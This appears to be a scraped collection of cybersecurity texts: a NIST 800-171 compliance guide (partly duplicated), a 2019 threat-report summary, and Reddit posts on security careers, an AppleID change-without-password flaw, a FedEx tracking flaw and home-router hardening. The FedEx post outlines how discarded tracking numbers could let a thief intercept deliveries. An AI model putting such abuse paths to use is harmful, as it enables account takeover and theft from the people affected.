pages of documentation! So heres the scary part.....This was only the preaudit! A pre-audit is a readiness assessment that allows the business to ensure administrative, technical, and physical controls are appropriately documented. To become compliant, the client organization must also undergo a Security Assessment (certification and authorization) by an independent assessor. Necessary documentation includes but is not limited to: * NIST 800-171 System Security Plan (SSP) * NIST 800-171 Plan of Action &amp; Milestones (POAM) * NIST 800-171 Policies &amp; Standards * NIST 800-171 Response Procedures (SOPs) * NIST 800-171 Evidence &amp; Artifacts * NIST 800-171 Network Diagram * NIST 800-171 Compliance Log (compliance tracking mechanism) For more information regarding the difference between policies and standards, and how to create a policy hierarchy to comply with various requirements please refer to *""How to Create a Cybersecurity Policy Hierarchy"" by Blake Curtis.* ### Reviews (Audit/Assess) Once the business area has completed its required documents, your internal audit, risk &amp; compliance departments will need to review each document to ensure the business units evidence is relevant, reliable, and sufficient. I strongly suggest leveraging two independent internal parties to review each response to the 800-171 control objectives. The organization should **ensure at least one party has hands-on experience in information technology and/or security** **to ensure risks are appropriately identified and mitigated.** To provide more clarity, please reference the suggested workflow: 1. The business unit populates the NIST response procedures (SOPs), NIST Evidence &amp; Artifacts) and switches the response status to **Awaiting Internal Audit's Review** in the compliance log. 2. Internal Audit reviews the policy, standards, responses and evidence and changes the status to **Awaiting IT Risk's Review** if no deviations are found. &amp;#x200B; [Security Assessment Report \(SAR\) template part 1 by Blake Curtis](URL **Note**: If the internal audit department has any reservations regarding the reliability, sufficiency, or relevance of the response, they will provide the business unit with an audit opinion and recommendation on how to better substantiate their claims. &amp;#x200B; [Security Assessment Report \(SAR\) part 2 by Blake Curtis](URL 3. The IT risk department reviews the responses and changes the status to **Awaiting Final Review** if no deviations are found. **Note**: If the IT risk department has reservations regarding the evidence, policies, or procedures, they will provide the business unit with their opinions &amp; recommendations. 4. The Authorizing Official (sponsor) or delegated authority (business unit manager) performs the final review and changes the status to **Approved**. &amp;#x200B; [NIST 800-171 Compliance Log by Blake Curtis](URL ### Certification &amp; Accreditation Process (Approval) At the closure of the project, the final sign-off on the SSP is completed. The following are a suggested list of important roles that should be considered during this process. 1. **Chief Information Security Officer** \- ensures the appropriate application of safeguards and countermeasures and ensures that policies reflect senior management's intent, direction, and objectives. 2. **Director of Risk or Audit** \- certifies that controls exhibit both design and operational effectiveness and provides an audit opinion and conclusion of the operating environment. 3. **Director of Client Organization** \- acts as the authorizing official or system owner depending on the organizational structure and is responsible for ensuring risk are within an acceptable level and approving the implementation based on an established set of specifications and controls. &amp;#x200B; [SSP Template by Blake Curtis](URL Once the SSP is approved, the business unit can proceed to the next steps such as signing the contract or agreement, initiating personnel training and beginning the work. It is important to note these next steps are contingent on SSP approval. ## 7 STEPS TO NIST 800-171 COMPLIANCE &amp;#x200B; [7 Steps to NIST 800-171 Compliance by Blake Curtis](URL &amp;#x200B; [7 Steps to NIST 800-171 Compliance with descriptions by Blake Curtis](URL f you have questions regarding templates, demos and examples, contact me @[URL ## SO...IS THAT ALL?...OF COURSE NOT ### Certifying Your Compliance Program Please note, that the 7 steps are just the minimum requirements needed to establish an effective compliance program. There are 14 control families and a total of 110 controls. Each control objective (security requirement) must be supported by policy, standards, and evidence. Each security requirement must have a strong balance of control types, classes, and implementations. For example, each control or set of controls must have the ability to: * **Detect, Prevent, &amp; Correct** be implemented as: * **Administrative, Technical, and Physical** and evaluated based on its * **Automated vs Manual** implementation For more information on Control Effectiveness &amp; Control Diversity, please reference *""If You Think Auditing is Boring, You're Probably Doing it Wrong"" by Blake Curtis* Once you have successfully implemented your compliant environment, you will need to work with your internal audit/risk department to evaluate the effectiveness of safeguards and countermeasures. It is critical that we assure that the risk associated with the program is within acceptable levels and that the authorizing official and sponsor are satisfied with the implementation. ### More Considerations Equates to More Complexity Recently, NIST released the 800-171B draft. The DoD also released the Cybersecurity Maturity Model which introduces even more complexity and difficulty for DoD contractors and research organizations who need to become NIST 800-171 compliant. **NIST 800-171B for High-Value Assets** The NIST 800- 171B draft is comprised of a set of enhancements and recommendations that organizations can leverage for information assets that have higher levels of intrinsic risk and impact on the project or organization. Reference: [URL **The Cybersecurity Maturity Model** The Cybersecurity Maturity Model is a measurement scheme similar to the Capability Maturity Model Integrated (CMMI). Various organizations and sponsors will evaluate maturity by measuring the effectiveness of the cybersecurity program by assessing the presence of policies, standards, procedures, and how much of the program is automated versus its dependency on manual intervention. This means that sponsors may require your organization to comply with a specific maturity level to participate in sensitive activities and even to receive research grants! References: [URL [**URL ### Ongoing Monitoring &amp; Maintenance Continuous monitoring and maintenance are vital parts of any cybersecurity program and are essential if one wishes to sustain conformance with NIST 800-171. So how do we remain compliant and monitor conformance with our established program? We need to ensure that we have a good balance of policies, standards, and technology. You may be thinking, how will a policy ensure ongoing monitoring and maintenance, but bare with me, and will all make sense in this next paragraph. **Policy &amp; Standards** Policies and standards give us two vital things. **Policies** reflect management's expectations, direction, what we should comply with, and what standards can be leveraged to enforce and measure compliance with the policy. **Standards** are mandatory requirements that provide more specificity to how technologies, processes, and procedures should be utilized to comply with the organization's policy. Standards essentially provide us with the ability to interpret a vague policy by giving it more context. For example, a policy can mandate that the organization leverage strong authentication methods and passwords to prevent unauthorized access and enforce nonrepudiation. The policy is not very specific and allows room for the standards to flex and support the intent of the policy. For example, the organization can leverage the policy to create specific standards for various technologies and platforms and how they should be configured to support the policy (Active Directory, AWS, Azure, Microsoft, Linux, and more.) Now that I've bored you to death describing the importance of policies and standards, let's move on to the fun part, the technology! **Leveraging Technology to Support Policy and Standards** Endpoint protection and configuration management tools can enable us to detect, prevent, and correct unauthorized modifications, configuration drift, software installations, and unauthorized access. Daily vulnerability scans, endpoint detection, and response tools, SIEM, and patch management are great logical controls that can assist us throughout this endeavor. However, technical controls are not enough. Policies, standards, and procedures (SOPs) are needed to balance out the pitfalls of technology and vice versa. Lastly, audit/assessments should be conducted when significant changes occur within the organization or infrastructure and based on an organizationally defined frequency &amp;#x200B; [Policy, Procedures, &amp; Evidence for 3.4 Configuration Management Example by Blake Curtis](URL **Conclusion** &amp;#x200B; [NIST 800-171 Compliance Log | Overall Completition screenshot by Blake Curtis](URL As you can see, defining, establishing, and maintaining a cybersecurity/compliance program is not an easy task and requires a diligent set of individuals who are committed to maintaining and improving organizational processes on a continual basis.

What may be deemed as low and consumable for citizens by the government could have a major impact on an organization, especially if the business classifies that same data as sensitive, critical, or if it provides the business with a competitive advantage. Data classification is the enterprise's ability to classify and prioritize business processes, data, and systems by considering its sensitivity and criticality (importance). For more information on data classifications and minimum security requirements, please reference *""Using Data Classifications for Effective Decision Making"" by Blake Curtis* ## SO HOW DO I BECOME NIST 800-171 COMPLIANT? ### Three Holistic Components There are three holistic components we need to complete for a NIST 800-171 assessment. Those components are comprised of documentation, reviews, and the authorizing officials (project sponsors) approval. However, just because weve completed these steps does not mean that our program is compliant. Your program needs to be independently assessed and verified by a third party that doesnt have a vested interest or bias in the completion of your project or success. Your client organizations must be able to communicate the need for a compliant environment and engage its risk, compliance, and security teams to create documentation that substantiates their conformance to NIST 800-171. They must also demonstrate the employment of ongoing monitoring measures to assure continuous compliance. Subsequently, there are various levels of review that must be accomplished throughout the certification and accreditation process. &amp;#x200B; [Blake Curtis NIST 800171 Holistic 3 Step Process Image](URL # Documentation There is a tremendous amount of documentation associated with any NIST 800171 effort. For example, a complete assessment of one of my client organizations comprised just four systems and a virtualized file &amp; print server that resulted in over 300 pages of documentation! So heres the scary part..This was only the preaudit! A pre-audit is a readiness assessment that allows the business to ensure administrative, technical, and physical controls are appropriately documented. To become compliant, the client organization must also undergo a Security Assessment (certification and authorization) by an independent assessor. Necessary documentation includes but is not limited to: * NIST 800171 System Security Plan (SSP) * NIST 800171 Plan of Action &amp; Milestones (POAM) * NIST 800171 Policies &amp; Standards * NIST 800171 Response Procedures (SOPs) * NIST 800171 Evidence &amp; Artifacts * NIST 800171 Network Diagram * NIST 800171 Compliance Log (compliance tracking mechanism) For more information regarding the difference between policies and standards, and how to create a policy hierarchy to comply with various requirements please refer to *How to Create a Cybersecurity Policy Hierarchy by Blake Curtis.* # Reviews (Audit/Assess) Once the business area has completed its required documents, your internal audit, risk &amp; compliance departments will need to review each document to ensure the business units evidence is relevant, reliable, and sufficient. I strongly suggest leveraging two independent internal parties to review each response to the 800171 control objectives. The organization should **ensure at least one party has hands-on experience in information technology and/or security** **to ensure risks are appropriately identified and mitigated.** To provide more clarity, please reference the suggested workflow: 1. The business unit populates the NIST response procedures (SOPs), NIST Evidence &amp; Artifacts) and switches the response status to **Awaiting Internal Audits Review** in the compliance log. 2. Internal Audit reviews the policy, standards, responses and evidence and changes the status to **Awaiting IT Risks Review** if no deviations are found. &amp;#x200B; [Security Assessment Report \(SAR\) template part 1 by Blake Curtis](URL **Note**: If the internal audit department has any reservations regarding the reliability, sufficiency, or relevance of the response, they will provide the business unit with an audit opinion and recommendation on how to better substantiate their claims. [Security Assessment Report \(SAR\) part 2 by Blake Curtis](URL 3. The IT risk department reviews the responses and changes the status to Awaiting Final Review if no deviations are found. Note: If the IT risk department has reservations regarding the evidence, policies, or procedures, they will provide the business unit with their opinions &amp; recommendations. 4. The Authorizing Official (sponsor) or delegated authority (business unit manager) performs the final review and changes the status to Approved. [NIST 800-171 Compliance Log by Blake Curtis](URL ### Certification &amp; Accreditation Process (Approval) At the closure of the project, the final sign-off on the SSP is completed. The following are a suggested list of important roles that should be considered during this process. 1. **Chief Information Security Officer** \- ensures the appropriate application of safeguards and countermeasures and ensures that policies reflect senior management's intent, direction, and objectives. 2. **Director of Risk or Audit** \- certifies that controls exhibit both design and operational effectiveness and provides an audit opinion and conclusion of the operating environment. 3. **Director of Client Organization** \- acts as the authorizing official or system owner depending on the organizational structure and is responsible for ensuring risk are within an acceptable level and approving the implementation based on an established set of specifications and controls. [SSP template by Blake Curtis](URL Once the SSP is approved, the business unit can proceed to the next steps such as signing the contract or agreement, initiating personnel training and beginning the work. It is important to note these next steps are contingent on SSP approval. ## 7 STEPS TO NIST 800-171 COMPLIANCE &amp;#x200B; [7 Steps to NIST 800-171 Compliance by Blake Curtis](URL &amp;#x200B; [7 Steps to NIST 800-171 Compliance with descriptions by Blake Curtis](URL If you have questions regarding templates, demos and examples, contact me @ [URL ## SO...IS THAT ALL?...OF COURSE NOT ### Certifying Your Compliance Program Please note, that the 7 steps are just the minimum requirements needed to establish an effective compliance program. There are 14 control families and a total of 110 controls. Each control objective (security requirement) must be supported by policy, standards, and evidence. Each security requirement must have a strong balance of control types, classes, and implementations. For example, each control or set of controls must have the ability to: * **Detect, Prevent, &amp; Correct** be implemented as: * **Administrative, Technical, and Physical** and evaluated based on its * **Automated vs Manual** implementation For more information on Control Effectiveness &amp; Control Diversity, please reference *""If You Think Auditing is Boring, You're Probably Doing it Wrong"" by Blake Curtis* Once you have successfully implemented your compliant environment, you will need to work with your internal audit/risk department to evaluate the effectiveness of safeguards and countermeasures. It is critical that we assure that the risk associated with the program is within acceptable levels and that the authorizing official and sponsor are satisfied with the implementation. ### More Considerations Equates to More Complexity Recently, NIST released the 800-171B draft. The DoD also released the Cybersecurity Maturity Model which introduces even more complexity and difficulty for DoD contractors and research organizations who need to become NIST 800-171 compliant. **NIST 800-171B for High-Value Assets** The NIST 800- 171B draft is comprised of a set of enhancements and recommendations that organizations can leverage for information assets that have higher levels of intrinsic risk and impact on the project or organization. Reference: [URL **The Cybersecurity Maturity Model** The Cybersecurity Maturity Model is a measurement scheme similar to the Capability Maturity Model Integrated (CMMI). Various organizations and sponsors will evaluate maturity by measuring the effectiveness of the cybersecurity program by assessing the presence of policies, standards, procedures, and how much of the program is automated versus its dependency on manual intervention. This means that sponsors may require your organization to comply with a specific maturity level to participate in sensitive activities and even to receive research grants! References: [URL [**URL ### Ongoing Monitoring &amp; Maintenance Continuous monitoring and maintenance are vital parts of any cybersecurity program and are essential if one wishes to sustain conformance with NIST 800-171. So how do we remain compliant and monitor conformance with our established program? We need to ensure that we have a good balance of policies, standards, and technology. You may be thinking, how will a policy ensure ongoing monitoring and maintenance, but bare with me, and will all make sense in this next paragraph. **Policy &amp; Standards** Policies and standards give us two vital things. **Policies** reflect management's expectations, direction, what we should comply with, and what standards can be leveraged to enforce and measure compliance with the policy. **Standards** are mandatory requirements that provide more specificity to how technologies, processes, and procedures should be utilized to comply with the organization's policy. Standards essentially provide us with the ability to interpret a vague policy by giving it more context. For example, a policy can mandate that the organization leverage strong authentication methods and passwords to prevent unauthorized access and enforce nonrepudiation. The policy is not very specific and allows room for the standards to flex and support the intent of the policy. For example, the organization can leverage the policy to create specific standards for various technologies and platforms and how they should be configured to support the policy (Active Directory, AWS, Azure, Microsoft, Linux, and more.) Now that I've bored you to death describing the importance of policies and standards, let's move on to the fun part, the technology! **Leveraging Technology to Support Policy and Standards** Endpoint protection and configuration management tools can enable us to detect, prevent, and correct unauthorized modifications, configuration drift, software installations, and unauthorized access. Daily vulnerability scans, endpoint detection, and response tools, SIEM, and patch management are great logical controls that can assist us throughout this endeavor. However, technical controls are not enough. Policies, standards, and procedures (SOPs) are needed to balance out the pitfalls of technology and vice versa. Lastly, audit/assessments should be conducted when significant changes occur within the organization or infrastructure and based on an organizationally defined frequency.

Attackers continued to stick to a well-known playbook for the second quarter of 2019, focusing on attacking websites using SQL injection attacks and stealing passwords and credentials via malware and phishing attacks. While the company saw a slight decline in many threat metrics  with antivirus detections declining 6% between quarters and more sophisticated threats declining 2%  each of the top 10 network attacks increased in volume, with the frequency of the top attack, SQL injection, jumping by a factor of 12. Overall, the two types of SQL injection attacks included on the list counted for more than a third of all network attacks detected. Only two of the other top 10 attacks  exploits focused on vulnerabilities in Adobe Flash and Shockwave  were not Web-based threats. ""The top network attacks have remained Web-based attacks for many, many quarters  either a direct vulnerability in Web server software; a Web-client attack, where it is a drive-by download that affects the client; or a Web-application attack on a vulnerability in either a framework that you installed or in your custom code,"" says Corey Nachreiner. In addition to focusing on attacking Web applications, attackers aimed to harvest credentials from compromised machines and users. The top threat, Mimikatz, is an open source tool originally created in 2014 as a project to learn coding but whose purpose is to harvest several different types of credentials, including plain-text password, hashes, kerberos tickets, and PIN codes. In addition, a phishing attack that aims to harvest users' credentials also made the top 10 threat list. ""The trend of authentication being a target, while not a new one this quarter, remains big,"" Nachreiner says. This report is not the first to note the all-out assault that online attackers are waging on user and administrator credentials. Earlier this year, Trend Micro and Rapid7 noted that phishing attacks and credential-stuffing attacks had both taken off. In April, Akamai also reported that it had detected some 30 billion attempts to login to services using the wrong credentials. ""It is a constant problem,"" said Martin McKeay, a security researcher and editorial director at Akamai, at the time. Three of the 10 malware detections by volume were also the most widespread . ""When we started do this, there was not much overlap between the lists,"" he says. ""The fact that three of the most widespread piece of malware were also on the top 10 list is interesting  and when something is both widespread and high-volume, that should give you some pause. The trend of authentication being a target, while not a new one this quarter, remains big."" The top of the detection list is Mimikatz, which does not show up on the widespread list. ""The credential-theft tool Mimikatz has remained a top threat for the last two years, mirroring the threat landscape trend of attacks most commonly leveraging stolen credentials,"" the report states. ""These days, it isn't enough to simply use a strong and unique password. Attackers have too many ways to steal that password right out from under you, whether it be from tools like Mimikatz or through clever phishing attacks."" Mimikatz is not the only penetration tool used by online attackers. Two modules for the Kali Linux distribution for penetration testers made the top 10 list as well."

My current predicament is that I feel like I am stagnating in my current position, something I fear like the plague it self. My current predicament is that I dont feel like I am able to develop, I have seriously asked the head of security for more responsibility. I feel like I have done more then enough to prove my abilities are more than good enough. I have discovered several vulnerabilities on customer networks, some pretty sever. I have at several occasions gotten told that a customer have been praised by customers after handling a incident with them. I was also hand picked to start preparations for vulnerability testing for one of our major clients, this is something I told them I was wanting to work with and was kind of promised, based on my education. And really the only one having any business doing this in a live production environment. But after doing all the preparations mapping the networks and what boxes not to touch, I was shut off from the project. To be fair though I was scheduled to have my off period during the time after the preparations, but I explicitly said I was willing to come to work FREE to do it. Because I wanted the experience. To add to this for me baffling stew of non logic. We where asked to deliver proposals to how to improve our department, I did so by delivering a 4 page document via mail, containing work flow improvement, employee development program aka employees have to set goals, and suggestions to different services we could deliver for customers regarding vulnerability checking etc. Nothing revolutionary by any stretch of the imagination, that was 3 months ago, He has not mentioned it with a single word, whats mind boggling tough is that some of my suggestions are now being implemented, like the vulnerability stuff. But I am not involved what so ever. Isnt this a bit strange? The main problem for me where I am currently working is the lack of things to do, there is the monitoring and alarms but that shit is something a monkey could do, alarm? Lets see. Oh its page file well cant do non about that, so I guess ill have to make a case and put it on the night shift. If there is actually any work, we have to give it to another department like Server/vm or SQL or some other shit. We operate more like a 24/7 call center than anything else Its so frustrating feeling like I have been cat fished in to this hell hole of a positions I was promised would be a excellent spring board for my career.

I'm also fortunate to (and grateful for) have access to a highly experienced and knowledgeable senior engineer who's mentored and supported me enormously. I've gradually been getting to grips with how diverse the field is and building my knowledge but I constantly feel like I'm an inch deep and a mile wide (there's probably possibly some imposter syndrome there) and I'd appreciate some help to help myself guide my work in a way that's going to benefit me and my company. **The detail**: * I'm legit not trying to appear ungrateful for what I have. I recognise I have an opportunity a lot of people don't have and I'm simply looking to be a better cybersecurity professional. * I'm new to cybersecurity and studying and working in a business with a fairly immature cybersecurity posture (I've heard that's not unlike the majority of my sector) in an incredibly small team (also not unlike the majority of my sector). * My team is unfortunately logically and physically isolated from the other operational teams (that's not a specific criticism but it's far from helpful) so I often find myself on the outside (more on that later). * I've been dipping in and out of various areas of work (e.g. data loss prevention, malware prevention, phishing, and vulnerability scanning) without being able to get my teeth into any one thing (I don't have any prior experience so I'm not sure if that's normal for junior security analysts). * I'm anxious I should be finding an area in which to (for want of a better word) specialise at this point in my placement to make myself more employable but there are so many areas in which I'm interested. I'm also anxious I'm vulnerable to paralysis by analysis and spending more time thinking about where to start guiding myself than actually doing it. * While it's unhelpful my team is isolated from the other operational teams I do have an opportunity to guide my own learning and work a bit. The issue is I'm struggling to figure out how to guide it. I'm currently studying to take my SSCP certification (using material on IT Pro TV) alongside my existing studies. **The question**: Please, can I have some advice on how to direct myself in the cybersecurity field? Please note I'm not asking for people to tell me what to do (e.g. ""specialise in X, or Y"", or even not specialise at all!). I can do that myself and don't want other people to do the emotional labour for me. I don't have a lot of strong guidance, though, and would be grateful for any and all input."
206,vulnerability,cybersecurity,AppleID security vulnerability ignored by apple,1,d0ahtv,https://www.reddit.com/r/cybersecurity/comments/d0ahtv/appleid_security_vulnerability_ignored_by_apple/,2019-09-06 12:19:44,"Hello all, AppleID unique identifier email address can be easily changed by any associated Apple Device, without entering any password, cannot be tracked, and impossible to recover. **Heres what happened**: Last night I received an email notification that my work AppleID and associated email addresses had changed  a change not made by me. When I attempted to log into my account I received a message stating my AppleID was invalid. When I attempted recreate my account with the same ID I was denied and received an error stating my account already existed. After talking to multiple Apple support reps for 2 hours, Apple was unable to locate my account and said to ignore the email as my account didnt exist (genius). Shortly after I received a notification from a colleague who informed me that this work account was logged into the iPhone he just received and that this phone was being used by his 10 year old daughter. She had unknowingly reset my work AppleID, password and emails - all without being asked verify account credentials. I reproduced the behavior on both my other iPhones - if I wanted to replace email addresses associated with the account or change my AppleID, there was no password prompt. An email was sent to the new AppleID email as confirmation of the change - that is all someone has to do to take over the account. The notification content sent to the previous AppleID only stated that the AppleID has been changed, with no other information regarding what it has been changed to, or any way to stop the change (ie, Was this you? Yes/No). Also, to reset an AppleID password you do not have to supply the current password. On top of it all, Apple does not internally track the history pertaining to an AppleID. Combined with the fact the message content sent to the original AppleID email address does not mention the new AppleID, Apple support cant look up the account. I was told to ignore the email sent to the old AppleID; meaning any fraudulent activities could continue on longer without being addressed. I was floored - my account was compromised by a child. Apple told me the iOS is working ""as expected"". This is the AppleID were talking about, the most basic unique identifier to your account info to your Apple ecosystem - your contacts, your iMessage, your iCloud, your app purchase, your applePay, etc. If anyone who has access to ANY device linked to the AppleID, they can change the AppleID without any additional security verification; then this is the worst/careless design flaw. And Apple support wont even acknowledge it. Here are my view on the potential areas to address: **Security prompt / current AppleID password entry should be required for changing a AppleID password/email** * a. AppleID/password changes should be independent behavior from Device password, therefore should be secured separately. * b. Also, having all apple Device ability to change AppleID without password is many-folds higher chances of stolen or shared devices being compromised, both unintentionally and intentionally. **Apple should log the from/to relationship info for AppleID/email changes** * a. In a situation where an account is compromised maliciously, I would never be informed of the new AppleID, only that it had been changed. Thus I could never recover my information, AKA all is lost. **Apple should give user ability/option to stop the change in AppleID in the content sent to the original AppleID address.** * a. Google sends a notice to verify legitimacy of action in (Yes/No) form whenever a new device is logged in using a GMail account - and thats just for log-in. Something similar should definitely be done for as critical of a change as AppleID. **Apple should clearly specify the new AppleID email address in the content sent to the old email address.** * a. There should be no reason why this is a privacy issue. AppleID contains all private info of a user, as mentioned above. If these are transferred, the destination should definitely be known to the original owner. And of course, this would require Apple to actually track this information first, which is not currently done. TLDR - One of my Apple accounts was recently compromised and after speaking to apple multiple times my complaints fall on deaf ears."

This is my very first post on Reddit that I can at least remember. I've worked in the Financial World for many years as an INFOSEC Analyst, a Cybersecurity Analyst, and now an ""IT Security Analyst"". Alongside multiple CISSP's, Security Sysadmins, ISO's, CISO's etc.. .. I worked primarily in a SOC for many years, responding to alerts, working on a SIEM, managing NGFW's, Risk Management &amp; vulnerability assessments with direct communication with Compliance etc, etc.. blah blah blah.. &amp;#x200B; I've recently began working for a company that is half the size of the last company I worked for.. It's almost ""mom and popish"" in presentation (which I thought was an appeal; a slow down - It is however NOT). Although per the guidelines of the company they have no problem throwing money at any solution they can think of which sounds like an awesome caveat.. .. However. After stepping in I've seen that they want to spend more time with their analysts working on Group Policy, and active directory permissions. The SIEM is not usable, and is not even reporting/alerting. Today I sat in on a SOC as a service demo, and watched those around me be overly impressed by a basic search box while they ripped Kibana and called it their own 100% platform.. The ISO has zero policy input, and those around me desire direction but don't believe company policy is the way to do so. The company wants to look into Red VS. Blue style audits, of which I have taken part in with past employers and have said multiple times since my first week they are not ready.. although it continues to be brought up. I am very young, and every company I've come to work for makes it a point to notice the ten-year + difference. It's part of what caused me to leave the last company.. Everyone at this new company has literally said they'd rather log directly into the system instead of checking the syslogs on the SIEM.. and then are upset when they do not receive clean reporting or granular data. \-- If you are are currently someone in the field.. what are your thoughts? I'm literally rebuilding parts of the IPS right now because there wasn't even an email set for basic email alerting on attacks.. I'm not a sysadmin, and have no desire to be. This was kind of a rant.. but I truly in all the years of following Reddit want to know what someone else in the field thinks. Specifically if I need to be finding my way out at this early stage.. It's been two months. ""At this point we're not analysts. We're security admins."" - Supervisor"

I just dropshipped an item from New York to Colorado. If youre not familiar with dropshipping, it means someone purchases an item from a web store and the seller orders the item from another location whether it be the manufacturer or a distributor and has it sent to the buyer. Anyway, I went to check the tracking status and noticed there was an entry in the tracking info about having the package held at a FedEx location. It said I needed to enroll to get the details. I was already logged into my FedEx account and apparently enrolling meant adding the buyers address to my list of Delivery Addresses. This is what allows you to receive notifications via email and mobile about the tracking status or initial drop off of the shipment. Here is the weird part- it allowed me to change the delivery instructions for the package as well as put Vacation Holds (stopping deliverys for a set period of time) for that address... Keep in mind, I technically have nothing to do with this shipment. I just know the tracking number because I purchased it. This seems like a security vulnerability. Why should I have the ability to enter anyones address off a random shipping box I found in a dumpster and make changes to their service just because I have an old tracking number? Im not sure if it would allow me to redirect the shipment or not, but this isnt good. Correct me if Im missing something, but a thief could raid a card or recycling dumpster in their neighborhood, add their neighbors addresses as delivery addresses, get notifications whenever they have a package coming or delivered and intercept their shipments."

220,vulnerability,cybersecurity,Home Router Security Tips,2,ckkaqe,https://www.reddit.com/r/cybersecurity/comments/ckkaqe/home_router_security_tips/,2019-08-01 15:53:46,"It is very important to pay attention to the home router as compromise of our home router will lead to compromise of our home computer / laptop and even mobile phone (if it is connected via wireless to the router). Compromise leads to leakage of data, stealing of information, creation of backdoor in our computer and much more. We provide attention to our office workstation which is anyway protected by the various mechanisms (like perimeter firewall, IDS/IDP, Centralised Antivirus solution, end point security solution)by our organisation in addition to policies and procedures that we have to abide with. However we do not pay the same kind of attention to our home environment because either we neglect it or we think that information on our personal computer is not that crucial or confidential. However we tend to forget that we do online shopping, online banking, using email accounts, use social media accounts as they are important part of our day to day work. Such compromise leads to financial losses as well as loss of reputation. Hence we should pay attention to it. The first thing that the outsider, hacker, cyber criminal encounters (from the internet) is our router and hence it is our first line of defence.Therefore one must make sure that it is not vulnerable and should not be a sitting duck on internet. Hence, we must secure the home router. Let us see how to secure home router, 1. **Change the Default Settings** : When we buy router, the vendor provides us the router with default settings. One can say that it is pre-configured for certain parameters like default SSID, default login password, default IP address and such other parameters. These default settings for most of the product vendor is well known to bad actors as they keep the database of default settings for various vendors available with them and is also available online on numerous websites. Therefore it is extremely dangerous to keep the default settings as it is. Make sure that you change those default setings are changed when you connect your router to the network for the first time. Do not use it unless and until you change those settings. **2. Disable Remote Administration :** To ensure more features and facilities to the customer (end user), the routers are equipped with remote Administration/ Management capabilities. However this could be a big issue if an outsider is able to login to the interface (using methods like Default password, Brute force password, Easily guessed password) then he can change parameters such as DNS Server settings (that can divert you to malware infected websites) or may change wireless encryption from WPA to WEP, thereby weakening the encrypted communication and steal the data via MiTM attacks.Therefore make sure that ""Enable Remote Management"" is unchecked. 3. **Enable Firewall :** Most of the routers have inbuilt firewall feature that can restrict the inbound and outbound traffic through the router thereby making sure that your computer will remain secure. Hence make sure that the firewall is enabled on your router and is configured properly. You can even block specific traffic used by your other family members (such as torrents and Peer-to-Peer traffic that may be used to download illegal contents). 4. **Disable SSID broadcast :** The access point also known ass AP on the wireless network announce itself to the network about its presence so that the wireless client can connect to it (AP is built-in the router).Though this is helpful feature but the bad actors can find it easily and even your neighbours can find it and try to connect to it for free internet (of course if they can authenticate to it). Many War-drivers can find your broadcasted SSID as well that can be later used for some nefarious purpose.Therefore it is always a good idea to hide your SSID. That way nobody can casually find out your wireless network (eventually router). This is of course act like a deterrent and not a actual security solution. 5. **MAC address Filtering :** This feature helps the router to allow only those nodes to connect to the router whose MAC (Media Access Control) address (which is unique to every network card on your computer/laptop/Device) is part of white-listing. This means that you configure only those mac address in your router white-listing for which you have control and want to connect via your router and get connected to internet.You can find out your arp address easily 9 it may be mentioned on your device/accessory, ifconfig (Linux), ipconfig/all or getmac (Windows), ifconfig (OS-X)). 6. **Allocate limited IP address :** In the home router one can setup a DHCP server so that the router (with a built-in DHCP server), can allocate only limited number of IP addresses to the clients/nodes that are connecting to the router. Keep this number of IPs exactly matching to the number of client/nodes that you are having/using. Also make sure that the DHCP lease time is kept to maximum possible/allowed value so that the ip address will remain mapped to the mac address. Also make sure that the DHCP reservation is enabled and configured so that only particular mac address (of a device) will get a particular IP address from the range allocated by the DHCP server. 7. **Disable WPS :** WPS (WiFi Protected Setup), is designed for easy to add new devices to an existing network without entering long passwords.There are multiple approaches to network setup within WPS and they are push-button, PIN, and NFC. You can find the WPS pin printed on the router itself. However it is found that the WPS configuration is vulnerable to both online brute-force attack as well as offline brute-force attacks (also known as pixie-dust attack). Hence it is a good idea to disable WPS configuration feature on the router. 8. **Keep Firmware updated :** Just like your computer's OS, the router does have its own system that is designed to route the traffic from one network to another. There are also applications running on router that supports features like an inbuilt web server for remote GUI operations. However this tends to have vulnerabilities that gets exploited as and when found over a period of time.If these vulnerabilities are exploited than your computer is also at risk of being compromised in more than one way. The vendors of the router keep on providing patches / fixes whenever a new vulnerability is found in their product. Hence make sure that you apply those patches as and when made available by the vendor so as to keep the risk at bay. 9. **Disable Port Forwarding :** Port forwarding is a feature available in NAT (Network Address Translation) so that traffic can be forwarded from a port of one network to port on another network. This feature is used generally in home router so that an outsider who wants to access particular application/service of an inside computer (home computer), can reach it by accessing the external ip/internet ip/real ip . Here the port traffic from external ip is routed to a port of internal home computer. However, if the port forwarding feature remains available it provides extra point of attack on your home computer. Therefore if such service is not required or if the job is done then make sure that port forwarding is disabled. 10. **Disconnect router if not in use :** Once you finished using internet or network, it is always a good idea to disconnect/switch-off the router so that it A) is not accessible from internet B) The WiFi is not accessible for any kind of attacks. Remember WiFi is very much prone to various kind of attacks and can be used further to compromise the computers connected to the routers via WiFi connection. 11. **Enable brute-force protection :** This feature is available on new routers and may not be available on older routers(depends). Hackers, to get access to your router, try brute-force attack so that they can find out password of your router. This brute-force attack can be executed against various servers/services on the router. These services could be http,ftp, telnet etc... Hence make sure that you have enabled the option for brute-force protection on the router. 12. **Use WPA for secure wireless communication :** Most of us are aware that WEP (Wireless Equivalent Privacy) is already broken and even the ISP technician who comes to your home to connect/configure the router, suggest you to use WPA when you use WiFi network. It is a well known fact that WEP can be broken in a matter of few minutes and therefore should not be used. The other option that is available for secure wifi communication is use of WPA/WPA2 ( Wi-Fi Protected Access) as it is more secure as compared to WEP. 13. **Use WPA3 compatible routers (new routers) :** Though we have said (just now) that one should use WPA/WPA2, however the fact is WPA is also broken and if sufficient time is given, WPA can be broken. Now what could be a better or secure option ? . This option is made available with the WPA3 which is hack proof (as of now). WPA3 adds new features to simplify Wi-Fi security, enable more robust authentication, deliver increased cryptographic strength for highly sensitive data, and maintain resiliency of mission critical networks.However this feature is available only in new routers and they are stamped as Wi-Fi CERTIFIED WPA3 . 14. **Turn Off UPnP :** It is universal plug and play feature that is used to let devices on your network configure itself on an internal network. A malware ot trojan on the inside network may use this feature to open backdoor in your routers firewall and allow outsiders (that is people on internet) to enter your inside network. Hence it is advisable to turn off UPnP feature if feasible. On the router configuration menu, there is option to Enable or Disable UPnP feature. Just disable it. 15. **Avoid using ISP provided DNS server settings :** It is always a good idea to trust well known, publicly available DNS servers, just like Google DNS server (8.8.8.8) and Quad9 (9.9.9.9) rather than using your ISP's DNS server as they may not be properly configured or properly secured. This I can say because not all the small ISP's can have specific expertise to handle a particular issue in hand , here it is securing DNS server. This does not mean in any way that the ISP's don't pay attention to such issues. This is just as a part of precautionary measure. 16. **Turn Off unnecessary services :** As more services are available,there is 